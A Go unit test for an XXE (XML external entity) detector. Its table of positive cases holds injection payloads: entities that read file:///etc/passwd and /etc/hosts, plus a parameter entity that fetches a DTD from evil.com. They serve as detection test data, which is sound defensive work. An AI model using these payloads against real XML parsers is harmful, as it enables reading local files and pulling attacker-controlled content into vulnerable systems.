// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

package protocol

import "testing"

func TestXXE(t *testing.T) {
	d := &XXE{}
	tests := []struct {
		input  string
		should bool
	}{
		{`<!ENTITY xxe SYSTEM "file:///etc/passwd">`, true},
		{`<!ENTITY % param SYSTEM "http://evil.com/dtd">`, true},
		{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>`, true},
		{`%xxe;`, true},
		{`&xxe;`, true},
		{`normal text`, false},
		{`<xml>hello</xml>`, false},
	}
	for _, tc := range tests {
		r := d.Detect(tc.input)
		if r.Detected != tc.should {
			t.Errorf("input=%q: got detected=%v, want %v", tc.input, r.Detected, tc.should)
		}
	}
}
